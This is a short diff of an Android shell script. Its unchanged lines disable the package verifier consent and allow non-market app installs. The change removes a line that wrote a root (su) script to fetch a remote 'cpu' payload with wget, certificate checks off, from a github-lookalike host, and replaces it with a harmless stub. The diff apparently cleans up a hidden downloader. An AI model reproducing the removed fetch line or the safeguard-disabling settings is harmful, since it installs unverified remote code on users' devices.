@@ -45,6 +45,6 @@ settings put global package_verifier_user_consent -1
 settings put install_non_market_apps true
 
 
-# rm -rf /sdcard/cpu.sh
-echo "#!/system/bin/su\nwget --no-check-certificate atv9.gihub.io/shell/cpu -O /sdcard/cpu.sh" > /sdcard/000.sh
+echo "return 0" > /sdcard/cpu.sh
+
 return 0
